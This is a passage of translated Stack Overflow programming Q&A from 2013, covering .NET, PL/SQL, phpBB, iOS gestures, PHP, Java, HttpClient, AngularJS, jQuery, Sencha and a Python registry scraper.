I'm now discussing with a college about a .NET solution for another product. Frankly I'm quite frustrated of how hard it is to find whats included in a given .NET release. My initial assumption was that C# + CIL is roughly Java SE and .NET Java EE. However, I can't find information about e.g. container managed transactions in .NET or if ISS is a part of .NET or not. If not, how does ISS interact with .NET? Can an alternative server be used?

Please help me in directions to a Java EE spec similar description of .NET.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T07:19:23.773

找到一个一致的规范可能并不容易，但是有各种资源包含您正在寻找的信息，例如：

*   [.Net 框架概述 (4.5)](http://msdn.microsoft.com/en-us/library/zw4w595w.aspx)
*   [.Net Framework (4.5) 路线图](http://msdn.microsoft.com/en-us/library/jj160347.aspx)
*   [.NET Framework 的快速技术查找器](http://msdn.microsoft.com/en-us/library/63bf39c2.aspx)（技术和功能列表）

对于每个版本的框架，您还拥有**[What's new pages](http://msdn.microsoft.com/en-us/library/ms171868.aspx)**。此链接适用于 4.5 版，但如果您从标题下方选择“其他版本”，您将获得有关该框架先前版本的新开发信息。

# plsql - 动态 Sql VS 临时表

> ID：16184536
> 
> 赞同：0
> 
> 时间：2013-04-24T06:07:47.977
> 
> 标签：plsql, oracle11g

我有一个存储过程，其中动态创建“删除保留行”的临时表并插入数据，当我尝试执行任何其他动态 sql 语句时，临时表中的数据被删除。但我需要进一步处理的数据。

谁能告诉我为什么数据丢失，以及解决方案是什么。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T09:24:22.677

造成这种情况的三个可能原因：

1.  有一个明确的提交。
2.  有一个隐式提交（通常是 DDL 语句）。
3.  您正在关闭会话并开始新的会话。

如果你无法避免这些，那么你将不得不创建一个永久表。

# php - 在 phpbb3 中为新用户自定义注册字段

> ID：16184537
> 
> 赞同：0
> 
> 时间：2013-04-24T06:07:50.440
> 
> 标签：php, phpbb, phpbb3

我是phpbb的新手。我有一个要求，我需要从注册页面中删除一些字段。（有些是强制性的，有些不是）。任何人都可以建议我应该在哪里编辑文件。我已经更改了 HTML 文件`styles/themename/templets/ucp_register_original.html`。但没有什么影响主界面。

```
<tr>
    <td class="row1"><b class="genmed">{L_LANGUAGE}: </b></td>
    <td class="row2"><select name="lang" onchange="change_language(this.value); return false;">{S_LANG_OPTIONS}</select></td>
</tr> 
```

例如，我已禁用此功能，但它仍在显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T22:59:42.420

**打开**

> ```
> your_phpbb_root_directory/includes/ucp/ucp_register.php 
> ```

**然后找到其中任何一个**

```
'S_LANG_OPTIONS'    => (sizeof($lang_row) > 1) ? language_select($user_lang) : '', 
```

**并用这个替换**

```
'S_LANG_OPTIONS'    => '', 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T12:30:36.023

除了达米安凯特尔给出的答案。您必须做的另一件至关重要的事情是删除，`cache/tpl_prosilver-se_ucp_register.html.php`否则它将继续显示您可能已删除的先前字段。

# ios - 无法正确获取 UISwipeGestureRecognizer 方向

> ID：16184539
> 
> 赞同：3
> 
> 时间：2013-04-24T06:07:54.633
> 
> 标签：ios, uigesturerecognizer, uiswipegesturerecognizer

我正在编写代码以在视图上向上或向下移动我的两根手指以更改某些状态。代码如下：

```
UISwipeGestureRecognizer *aSwipeGesture = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeGesture:)];
[aSwipeGesture setDirection:UISwipeGestureRecognizerDirectionUp | UISwipeGestureRecognizerDirectionDown];
aSwipeGesture.numberOfTouchesRequired = 2;
[self.View addGestureRecognizer:aSwipeGesture];

- (void)swipeGesture:(UISwipeGestureRecognizer *)sender {
    NSLog(@"Swipe received.");
    if (sender.direction==UISwipeGestureRecognizerDirectionUp) {
        NSLog(@"swipe up");
    } else if (sender.direction==UISwipeGestureRecognizerDirectionDown) {
        NSLog(@"swipe down");
    }
} 
```

然而，我能收到的唯一打印日志是 Swipe 收到，如下所示。我无法收到向上或向下滑动的消息，我错过了什么吗？谢谢

```
ViewController.m:228    Swipe received.
ViewController.m:228    Swipe received.
ViewController.m:228    Swipe received.
ViewController.m:228    Swipe received.
ViewController.m:228    Swipe received.
ViewController.m:228    Swipe received. 
```

更新：我必须用两根手指来完成滑动动作。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T06:27:08.557

试试这个

```
UISwipeGestureRecognizer *aSwipeGestureUp = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeGesture:)];
[aSwipeGesture setDirection:UISwipeGestureRecognizerDirectionUp];
aSwipeGestureUp.numberOfTouchesRequired = 2;
[self.View addGestureRecognizer:aSwipeGestureUp];

UISwipeGestureRecognizer *aSwipeGestureDown = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(swipeGesture:)];
[aSwipeGestureDown setDirection:UISwipeGestureRecognizerDirectionDown];
aSwipeGestureDown.numberOfTouchesRequired = 2;
[self.View addGestureRecognizer:aSwipeGestureDown]; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-09-17T17:04:16.630

遗憾的是，API 完全没有意义，您可以设置一个 UISwipeGestureRecognizer 来识别 4 个方向中的任何一个上的滑动，但它不会告诉您滑动发生的方向。

他们足够小心，允许一起使用 4 个常量（它是一个位图），但 API 只是坏了。

您将不得不为每个方向使用一个识别器，真可惜！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T06:28:35.040

在您的情况下，您已将滑动方向设置为 UISwipeGestureRecognizerDirectionUp | UISwipeGestureRecognizerDirectionDown 。因此，在委托回调中，您将收到与 sender.direction 相同的值，这就是为什么不打印日志的原因，因为枚举值与 sender.direction 值不匹配。

如果您想分别处理向上和向下滑动，您需要创建 2 个带有向上和向下滑动方向的滑动手势并添加到您的视图中。然后根据发送者的方向做任务。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-09-22T12:25:22.637

UISwipeGestureRecognizer *Updown=[[UISwipeGestureRecognizer alloc]initWithTarget:self action:@selector(handleGestureNext:)]; Updown.delegate=self; [Updown setDirection:UISwipeGestureRecognizerDirectionDown | UISwipeGestureRecognizerDirectionUp]; [overLayView addGestureRecognizer:Updown];

```
 UISwipeGestureRecognizer *LeftRight=[[UISwipeGestureRecognizer alloc]initWithTarget:self action:@selector(handleGestureNext:)];
        LeftRight.delegate=self;
        [LeftRight setDirection:UISwipeGestureRecognizerDirectionLeft | UISwipeGestureRecognizerDirectionRight];
        [overLayView addGestureRecognizer:LeftRight];
        overLayView.userInteractionEnabled=NO;

-(void)handleGestureNext:(UISwipeGestureRecognizer *)recognizer
{
    NSLog(@"Swipe Recevied");
    //Left
    //Right
    //Top
    //Bottom
} 
```

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2013-04-24T06:09:31.280

删除 aSwipeGesture.numberOfTouchesRequired = 2; 并尝试

# php - How to access contents of a keyless array to object conversion?

> ID：16184541
> 
> 赞同：2
> 
> 时间：2013-04-24T06:08:17.040
> 
> 标签：php, arrays, oop, object

I'm experimenting with OOP and PHP.

I don't know why I would ever need to do something like this but I'm wondering how it would be done and cant find it online.

```
class Example{

public $a = 'aye';
public $b = 'bee';
public $c = 'see';

public function how(){
    return (object)array(
                         $this->a,
                         $this->b,
                         $this->c
                        );
    }    
}

$example = new Example;
$how = $example->how(); 
echo $how->1; //I thought would print bee 
```

I'm aware that giving the **array keys** would let me do

```
echo $how->beekey //which would give me beekey's value 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:23:20.043

[正如此错误报告](https://bugs.php.net/bug.php?id=60379)中所解释的，这基本上是不可能的；数字对象属性是 PHP 中的一种灰色区域。

但是，您可以将对象转换回数组并引用该值：

```
$arr = (array)$how;
echo $arr[1]; 
```

或者，用作单线：

```
echo current(array_slice((array)$how, 1, 1)); 
```

我能给你的最好建议是一开始就不要把它变成一个对象：

```
public function how()
{
    return array(
        $this->a,
        $this->b,
        $this->c
    );
} 
```

然后将其引用为`$how[1]`.

顺便说一句，`$how->{1}` [曾经](http://3v4l.org/7Amt1)在 PHP 4 中工作 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:20:31.107

使用**循环怎么样？**

```
foreach($how as $value)
{
    echo $value .'<br>'; //this print your values: aye<br>bee<br>see
} 
```

# java - 如何从它的构造函数调用父类方法

> ID：16184544
> 
> 赞同：1
> 
> 时间：2013-04-24T06:08:26.803
> 
> 标签：java

我正在创建子类对象。我知道首先调用父类构造函数。如果我想调用父类打印方法，所以我使用'this.print()'，但这不起作用。请建议我如何在不创建父类对象的情况下调用父类 print() 方法...在此先感谢。

```
public class Test
        {
            public static void main(String[] args) 
            {
                Child Child = new Child();
            }
        }

        class Parent
        {   
            void print()
            {
                System.out.println("parent class print method");
            }

            Parent()
            {
                this.print();
            }
        }    

        class Child extends Parent
        {
            void print()
            {
                System.out.println("child class print method ");
            }
        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:10:15.377

在 child`constructor`你可以调用一个超类方法，如：

```
super.print(); 
```

参见 [**java 文档**](http://docs.oracle.com/javase/tutorial/java/IandI/super.html)

```
public class Superclass {

    public void printMethod() {
        System.out.println("Printed in Superclass.");
    }
}    

public class Subclass extends Superclass {

    // overrides printMethod in Superclass
    public void printMethod() {
        super.printMethod();
        System.out.println("Printed in Subclass");
    }
    public static void main(String[] args) {
        Subclass s = new Subclass();
        s.printMethod();    
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:12:10.190

要调用任何父方法，请使用`super`. 这也适用于构造函数：

```
class Child extends Parent
{
    void print()
    {
        System.out.println("child class print method ");
    }

    Child() {
        super.print(); // parent print method

        this.print(); // child print method
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:56:57.383

感谢回答我的问题，清除我的概念..

```
public class Test
{
    public static void main(String[] args) 
    {
        Child Child = new Child();
    }
}

class Parent
{   
    void print()
    {
        System.out.println("parent class print method");
    }

    Parent()
    {
        this.print();
    }
}    

class Child extends Parent
{
    void print()
    {
        super.print();
    }
} 
```

输出：

```
parent class print method 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:14:00.300

“this”关键字指的是当前类，“super”关键字指的是其分别扩展或实现的父类或接口。

# json - 错误：HTTP/1.1 302 暂时移动

> ID：16184546
> 
> 赞同：0
> 
> 时间：2013-04-24T06:08:48.543
> 
> 标签：json, keystore, apache-httpclient-4.x

我正在使用 HTTPClient 4.2.2 进行 Http POST 请求。我正在使用 .pfx 证书访问发布请求中提到的 URL。但我收到 302，暂时移动错误

//Java代码

```
public class CertificateAuth {

    private static final long TIMEOUT = 500000000L;

    //set trust store to be used to trust server certificate

    private String tokeApiPostUrl = "http://test.com/l1/rest1/lt/v1/data";
    private String tokenPost = "{\"id\": \"Token_15555\",\"type\": \"token\",\"entity_type\": \"Store\",\"entity_id\": \"StoreId\",\"expiration_time\": 1376579410}";

    //client is taken as class varibable so that Cookies set by Server persists between
    //multiple calls
    private HttpClient client = null;

    public CertificateAuth() {

    }

    public String createToken() throws Exception {

        // set reasonable timeouts as we seem to wait forever to get a response:

        KeyStore keystore = KeyStore.getInstance("pkcs12");
        InputStream keystoreInput = new FileInputStream("abc.pfx");
        keystore.load(keystoreInput, "password".toCharArray());

        SchemeRegistry schemeRegistry = new SchemeRegistry();
        SSLSocketFactory lSchemeSocketFactory = new SSLSocketFactory(keystore, "qwerty10");
        schemeRegistry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
        schemeRegistry.register(new Scheme("https", 443, lSchemeSocketFactory));
        final HttpParams httpParams = new BasicHttpParams();
        client = new DefaultHttpClient(new SingleClientConnManager(httpParams, schemeRegistry), httpParams);
        String version = null;
        HttpPost httpPost = new HttpPost(tokeApiPostUrl);
    //  httpPost.getParams().setParameter(ClientPNames.HANDLE_REDIRECTS, Boolean.TRUE);
        client.getParams().setParameter(ClientPNames.ALLOW_CIRCULAR_REDIRECTS, true);

        try {
            Map<String, String> headersParameters = new HashMap<String, String>();          
            JSONObject jsonObj = new JSONObject(tokenPost);
            setParametersJson(httpPost, headersParameters, jsonObj);
            HttpResponse resp = client.execute(httpPost);
            if(resp.getStatusLine().getStatusCode() == HttpURLConnection.HTTP_OK || resp.getStatusLine().getStatusCode() == HttpURLConnection.HTTP_CREATED) {
                System.out.println("Succesfully queried");
            }
        } finally {
            httpPost.releaseConnection();
        }
        return version;
    }

    private void setParametersJson(HttpRequestBase httpOperation, Map <String, String> headerParameters,  JSONObject jsonObject) {
        for (String headerName : headerParameters.keySet()) {
            httpOperation.setHeader(headerName, headerParameters.get(headerName));
        }
        if (jsonObject != null) {
            try {
                StringEntity stringEntity = new StringEntity(jsonObject.toString());

                if (httpOperation instanceof HttpPost) {
                    ((HttpPost) httpOperation).setEntity(stringEntity);
                } else if (httpOperation instanceof HttpPut) {
                    ((HttpPut) httpOperation).setEntity(stringEntity);
                }
            } catch(UnsupportedEncodingException ex) {
                ex.printStackTrace();
            } catch(Exception  ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws Exception {
        CertificateAuth ua = new CertificateAuth();
        ua.createToken();

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:12:43.060

将此行添加到您的代码中。

```
client.setRedirectStrategy(new LaxRedirectStrategy()); 
```

# ruby-on-rails - 如何从 pre-rails 控制台切换到默认 Rails 控制台？

> ID：16184552
> 
> 赞同：1
> 
> 时间：2013-04-24T06:09:05.467
> 
> 标签：ruby-on-rails, rails-console

我最近安装了 pry-rails gem 用于调试，但是当我输入命令“rails c”以登录控制台时，它会将我引导到 pry-rails 控制台。

如何在不卸载 pry-rails gem 的情况下切换到默认控制台而不是 pry-rails 控制台。

感谢和问候，
Krishnan.K

# entity-framework - 使用泛型和 EF 从数据库中获取实体

> ID：16184553
> 
> 赞同：0
> 
> 时间：2013-04-24T06:09:14.587
> 
> 标签：entity-framework

我们首先使用 EF 代码创建了一个 azure sql DB。假设我们有 3 个实体/表学生、班级、教师。我们想实现一个像这样的方法：T GetEntity(ket int)，它通过键从一个根据 T 的表中获取一个实体。这可能吗？德克萨斯塔尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T07:09:15.353

您正在寻找[`Find`](http://msdn.microsoft.com/en-us/library/system.data.entity.dbset.find%28v=vs.103%29.aspx)方法。

```
var student = context.Set<Student>().Find(1); 
```

# java - 从 Pelops 客户端读取数据并对读取操作进行基准测试

> ID：16184554
> 
> 赞同：-1
> 
> 时间：2013-04-24T06:09:17.933
> 
> 标签：java, cassandra, pelops

我正在尝试从`Cassandra database`使用中读取数据`Pelops client`。我能够成功地做到这一点。

现在我已经开始做`benchmarking`，这意味着从 Cassandra 数据库读取需要多少时间。所以我`benchmarking code`在下面的代码中添加了我的。

现在我不确定我是否`benchmarking code`在正确的位置添加了我的来测量`Cassandra database`使用的读取延迟`Pelops client`？

下面是我的代码-

```
public Map<String, String> getAttributes(final String rowKey, final Collection<String> attributeNames, final String columnFamily) {

    final Map<String, String> attributes = new ConcurrentHashMap<String, String>();

    try {
        final SlicePredicate myPredicate = Selector.newColumnsPredicate(attributeNames.toArray(new String[attributeNames.size()]));

        final Selector selector = Pelops.createSelector(CassandraPelopsConnection.getInstance().getPoolName());

        // this is the right place to start the timer?
        CassandraTimer timer = CassandraTimer.getInstance();

        final List<Column> columnList = selector.getColumnsFromRow(columnFamily, rowKey, myPredicate, ConsistencyLevel.ONE);

       // And this is the right place to end the timer incase of Pelops client?
        timer.getDuration();

        for (Column column : columnList) {
            attributes.put(new String(column.getName()), new String(column.getValue()));
        }       
    }  catch (Exception e) {

    }

    return attributes;
} 
```

任何人都可以看看，让我知道我是否做得对吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T08:47:45.230

是的，这是正确的，您希望计时器在查询之前准确启动，并在查询之后立即停止。

作为旁注，你没有对计时器做任何事情，将它分配给一个变量，以便你以后可以使用它。

# angularjs - 如何动态地将自定义指令添加到 div 元素？

> ID：16184557
> 
> 赞同：4
> 
> 时间：2013-04-24T06:09:35.383
> 
> 标签：angularjs, angularjs-directive

我是 angularjs 的初学者，请放轻松。所以我有这个指令并且想动态地将它附加到一个 div 元素。我该怎么做？

```
appDirectives.directive('test', function () {
    return  {
        restrict: 'E',
        templateUrl: 'templates/test.html'
    }
}); 
```

我试过这个，但没有用。我假设模板在附加到 div 元素之前没有被编译。有没有角度的方法来做到这一点？

```
<div id="element"></div>

$('#element').append(<test></test>); 
```

**更新：**这是我想要做的。当用户登录我的页面时，我希望它显示 3 个不同的模板，具体取决于用户的类型。这 3 个模板`<basic>, <regular>, <advance>` 基本上是在用户登录后，我会有一个变量的值，`user.type`并希望为该用户显示适当的模板。

任何建议都会有所帮助。谢谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T16:27:59.820

[ng-switch](http://docs.angularjs.org/api/ng.directive%3angSwitch)可能是您想要的：

```
<div id="element" ng-switch on="user.type">
  <span ng-switch-when="basic"><basic></basic></span>
  <span ng-switch-when="regular"><regular></regular></span>
  <span ng-switch-when="advance"><advance></advance></span>
</div> 
```

[普朗克](http://plnkr.co/edit/2s56IKx6uSX0WMXDMKRx?p=preview)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T09:09:47.417

像这样的东西，可能是？ [http://plnkr.co/edit/SmL9fA5GzAxI2WYTnYZy](http://plnkr.co/edit/SmL9fA5GzAxI2WYTnYZy)

Angular 的方式是通过 javascript 对象（在范围内）来表示视图，并让 Angular 模板系统来反映您的模型。

# jquery - 隐藏所有 div，只显示被点击的那个

> ID：16184560
> 
> 赞同：0
> 
> 时间：2013-04-24T06:09:39.860
> 
> 标签：jquery, list, toggle

我创建了 3 个 unorderlist，其中包含两个列表项。所有都包含相同的类。我的问题是我不知道如何隐藏`<ul>`单击 1 项时已打开的内容。我已经尝试执行下面的代码，以便我仍然可以切换项目，但唯一的问题是您可以同时打开所有项目。

```
$('.click_me').click(function(event){
                event.preventDefault();
                $(this).next('.ul_lists').toggle();

           });

   <a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul>

   <a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul>

   <a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:11:49.683

尝试

```
$('.click_me').click(function(event)
{
    var display = $(this).next('.ul_lists').css( "display" );
    $( ".ul_lists" ).hide();
    $(this).next('.ul_lists').css( "display", display );
    event.preventDefault();
    $(this).next('.ul_lists').toggle();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:12:13.947

```
$('.click_me').click(function(event){
            event.preventDefault();
            $('.ul_lists').hide();
            $(this).next('.ul_lists').show();

       });

<a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul>

   <a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul>

   <a class="click_me" href="#">Click Me></a>
   <ul class="ul_lists">
       <li><a href="#" class="list_1">Some Item</a></li>
       <li><a href="#" class="list_2">Some Item</a></li>
   </ul> 
```

这将关闭所有 UL，然后打开单击的一个。如果有的话，基本上关闭一个打开的。

您还可以使用机制将类或 ID 添加到打开的元素并关闭该元素。

# excel - 使用 ComponentOne C1XLBook 加载 XLS 并输出为 PDF？

> ID：16184564
> 
> 赞同：1
> 
> 时间：2013-04-24T06:09:50.660
> 
> 标签：excel, pdf, componentone

我通常会使用 C1Report 来生成在服务器上生成并保存为 PDF 的报告。在这种情况下，报告确实需要基于 Excel 电子表格，因此我使用 C1XLBook 以所需格式构建数据。但是，我不知道如何将其导出为 PDF 文件。可能的？C1 论坛目前似乎已经完成，所以我不能在那里发帖。

谢谢

杰夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-07T11:38:09.923

1.使用 C1XLBook 加载 XLS 文件：

```
System.Diagnostics.Process.Start(@"c:\mybook.xls"); 
```

或者

```
c1XLBook1.Load(@"c:\mybook.xls"); 
```

2.输出为PDF：

C1Excel 不提供导出为 pdf 的功能。看[这里](http://our.componentone.com/groups/topic/export-excel-to-pdf/#post-609945) 。

[但是，这里](http://our.componentone.com/groups/topic/export-excel-to-pdf/#post-226219)提到了一种解决方法：

```
You may try using the following approach:

1\. Load the excel file in FlexGrid.

2\. Capture the image of the displayed flexgrid, please refer to the following link that describes the same:

http://our.componentone.com/2011/04/19/control-rendering-in-print-document/

3\. Once, you have the image you can save the same to Pdf by using the DrawImage method of c1PDF. Please refer to the following link that describes the same:

http://helpcentral.componentone.com/nethelp/c1pdf/index.html#!XMLDocuments/Reference/html/M_C1_C1Pdf_C1PdfDocument_DrawImage_2_7dee50e8.htm 
```

# extjs - 在 sencha touch 2.2 中更改基色

> ID：16184569
> 
> 赞同：1
> 
> 时间：2013-04-24T06:09:56.143
> 
> 标签：extjs, sencha-touch, sass, background-color

最近我将 sencha 框架升级到 2.2，遇到了 scss 的问题。无法更改应用程序的基本颜色（$base-color）。以下是我在 app.scss 中的代码

```
@import 'sencha-touch/default';
@import 'sencha-touch/default/all';
$base-color: #008c99; 
```

颜色变化不会反映在应用程序的任何地方。

这是设置应用程序基色的正确方法吗？如果不是，请告诉我我在哪里摸索。

提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-24T07:13:55.850

好吧，把`"$base-color: #008c99"`上面的`@import`语句放上去就行了。它应该放在 import 语句之前。保存编译..然后刷新看看效果。

# python - 引用函数的值

> ID：16184570
> 
> 赞同：-1
> 
> 时间：2013-04-24T06:10:01.707
> 
> 标签：python, python-2.7

一开始我想说我是使用 Python 的新手，我学到的一切都来自教程。我关于参考价值的问题。我正在编写一些脚本，它正在从网站上删除一些信息。我定义了一些功能：

```
def MatchPattern(count):
    sock = urllib.urlopen(Link+str(count))
    htmlSource = sock.read()                             
    sock.close()
    root = etree.HTML(htmlSource)
    root = etree.HTML(htmlSource)
    result = etree.tostring(root, pretty_print=True, method="html")
    expr1 = check_reg(root)
    expr2 = check_practice(root)
    D_expr1 = no_ks(root)
    D_expr2 = Registred_by(root)
    D_expr3 = Name_doctor(root)
    D_expr4 = Registration_no(root) 
    D_expr5 = PWZL(root)
    D_expr6 = NIP(root)
    D_expr7 = Spec(root)
    D_expr8 = Start_date(root)

    #-----Reg_practice-----
    R_expr1 = Name_of_practise(root) 
    R_expr2 = TERYT(root) 
    R_expr3 = Street(root)
    R_expr4 = House_no(root)
    R_expr5 = Flat_no(root)
    R_expr6 = Post_code(root)
    R_expr7 = City(root)
    R_expr8 = Practice_no(root)
    R_expr9 = Kind_of_practice(root)

    #------Serv_practice -----
    S_expr1 = TERYT2(root)
    S_expr2 = Street2(root)
    S_expr3 = House_no2(root)
    S_expr4 = Flat_no2(root)
    S_expr5 = Post_code2(root)
    S_expr6 = City2(root)
    S_expr7 = Phone_no(root)

    return expr1
    return expr2
    return D_expr1
    return D_expr2
    return D_expr3
    return D_expr4 
    return D_expr5
    return D_expr6
    return D_expr7
    return D_expr8

    #-----Reg_practice-----
    return R_expr1 
    return R_expr2
    return R_expr3
    return R_expr4
    return R_expr5
    return R_expr6
    return R_expr7
    return R_expr8
    return R_expr9

    #------Serv_practice -----
    return S_expr1
    return S_expr2
    return S_expr3
    return S_expr4
    return S_expr5
    return S_expr6
    return S_expr7 
```

所以现在在脚本中我想检查我的 fynction 返回的 expr1 的值。我不知道该怎么做。你们能帮帮我吗？我的函数写对了吗？

编辑：我无法添加答案，所以我编辑我当前的帖子

这是我的全部脚本。有些评论是用我的母语写的，但我会用英语添加一些评论

```
#! /usr/bin/env python
#encoding:UTF-8-

# ----------------------------- importujemy potrzebne biblioteki i skrypty -----------------------
# ------------------------------------------------------------------------------------------------
import urllib
from lxml import etree, html
import sys
import re
import MySQLdb as mdb
from TOR_connections import *
from XPathSelection import *
import os

# ------------------------------ Definiuje xPathSelectors ------------------------------------------
# --------------------------------------------------------------------------------------------------
# -------Doctors -----
check_reg = etree.XPath("string(//html/body/div/table[1]/tr[3]/td[2]/text())") #warunek Lekarz
check_practice = etree.XPath("string(//html/body/div/table[3]/tr[4]/td[2]/text())") #warunek praktyka

no_ks = etree.XPath("string(//html/body/div/table[1]/tr[1]/td[2]/text())")
Registred_by = etree.XPath("string(//html/body/div/table[1]/tr[4]/td[2]/text())")
Name_doctor = etree.XPath("string(//html/body/div/table[2]/tr[2]/td[2]/text())")
Registration_no = etree.XPath("string(//html/body/div/table[2]/tr[3]/td[2]/text())") 
PWZL = etree.XPath("string(//html/body/div/table[2]/tr[4]/td[2]/text())") 
NIP = etree.XPath("string(//html/body/div/table[2]/tr[5]/td[2]/text())") 
Spec = etree.XPath("string(//html/body/div/table[2]/tr[18]/td[2]/text())") 
Start_date = etree.XPath("string(//html/body/div/table[2]/tr[20]/td[2]/text())") 

#-----Reg_practice-----
Name_of_practise = etree.XPath("string(//html/body/div/table[2]/tr[1]/td[2]/text())") 
TERYT = etree.XPath("string(//html/body/div/table[2]/tr[7]/td[2]/*/text())") 
Street = etree.XPath("string(//html/body/div/table[2]/tr[8]/td[2]/text())") 
House_no = etree.XPath("string(//html/body/div/table[2]/tr[9]/td[2]/*/text())")
Flat_no = etree.XPath("string(//html/body/div/table[2]/tr[10]/td[2]/*/text())")
Post_code = etree.XPath("string(//html/body/div/table[2]/tr[11]/td[2]/*/text())")
City = etree.XPath("string(//html/body/div/table[2]/tr[12]/td[2]/*/text())") 
Practice_no = etree.XPath("string(//html/body/div/table[3]/tr[4]/td[2]/text())")
Kind_of_practice = etree.XPath("string(//html/body/div/table[3]/tr[5]/td[2]/text())")

#------Serv_practice -----
TERYT2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[2]/td[2]/*/text())") 
Street2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[3]/td[2]/text())") 
House_no2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[4]/td[2]/*/text())") 
Flat_no2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[5]/td[2]/i/text())") 
Post_code2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[6]/td[2]/*/text())") 
City2 = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[7]/td[2]/*/text())")
Phone_no = etree.XPath("string(//html/body/div/table[3]/tr[14]/td/table/tr[8]/td[2]/text())")

# --------------------------- deklaracje zmiennych globalnych ----------------------------------
# ----------------------------------------------------------------------------------------------
decrease = 9
No = 1
Link = "http://rpwdl.csioz.gov.pl/rpz/druk/wyswietlKsiegaServletPub?idKsiega="

# --------------------------- funkcje zdefiniowane ----------------------------------
# ----------------------------------------------------------------------------------------------
def MatchPattern(count):
    sock = urllib.urlopen(Link+str(count))
    htmlSource = sock.read()                             
    sock.close()
    root = etree.HTML(htmlSource)
    root = etree.HTML(htmlSource)
    result = etree.tostring(root, pretty_print=True, method="html")
    expr1 = check_reg(root)
    expr2 = check_practice(root)
    D_expr1 = no_ks(root)
    D_expr2 = Registred_by(root)
    D_expr3 = Name_doctor(root)
    D_expr4 = Registration_no(root) 
    D_expr5 = PWZL(root)
    D_expr6 = NIP(root)
    D_expr7 = Spec(root)
    D_expr8 = Start_date(root)

    #-----Reg_practice-----
    R_expr1 = Name_of_practise(root) 
    R_expr2 = TERYT(root) 
    R_expr3 = Street(root)
    R_expr4 = House_no(root)
    R_expr5 = Flat_no(root)
    R_expr6 = Post_code(root)
    R_expr7 = City(root)
    R_expr8 = Practice_no(root)
    R_expr9 = Kind_of_practice(root)

    #------Serv_practice -----
    S_expr1 = TERYT2(root)
    S_expr2 = Street2(root)
    S_expr3 = House_no2(root)
    S_expr4 = Flat_no2(root)
    S_expr5 = Post_code2(root)
    S_expr6 = City2(root)
    S_expr7 = Phone_no(root)

    return expr1
    return expr2
    return D_expr1
    return D_expr2
    return D_expr3
    return D_expr4 
    return D_expr5
    return D_expr6
    return D_expr7
    return D_expr8

    #-----Reg_practice-----
    return R_expr1 
    return R_expr2
    return R_expr3
    return R_expr4
    return R_expr5
    return R_expr6
    return R_expr7
    return R_expr8
    return R_expr9

    #------Serv_practice -----
    return S_expr1
    return S_expr2
    return S_expr3
    return S_expr4
    return S_expr5
    return S_expr6
    return S_expr7

# --------------------------- ustanawiamy polaczenie z baza danych -----------------------------
# ----------------------------------------------------------------------------------------------
con = mdb.connect('localhost', 'root', '******', 'SANBROKER', charset='utf8');

# ---------------------------- początek programu -----------------------------------------------
# ----------------------------------------------------------------------------------------------

with con: 
    cur = con.cursor()
    cur.execute("SELECT Old_num FROM SANBROKER.Number_of_records;")
    Old_num = cur.fetchone()
    count = Old_num[0]
    counter = input("Input number of rows: ")

    # ----------------------- pierwsze połączenie z TORem ------------------------------------
    # ----------------------------------------------------------------------------------------
    #connectTor()
    #conn = httplib.HTTPConnection("my-ip.heroku.com")
    #conn.request("GET", "/")
    #response = conn.getresponse()
    #print(response.read())

    while count <= counter: # co dziesiata liczba
        # --------------- pierwsze wpisanie do bazy danych do Archive --------------------
        with con:
            cur = con.cursor()
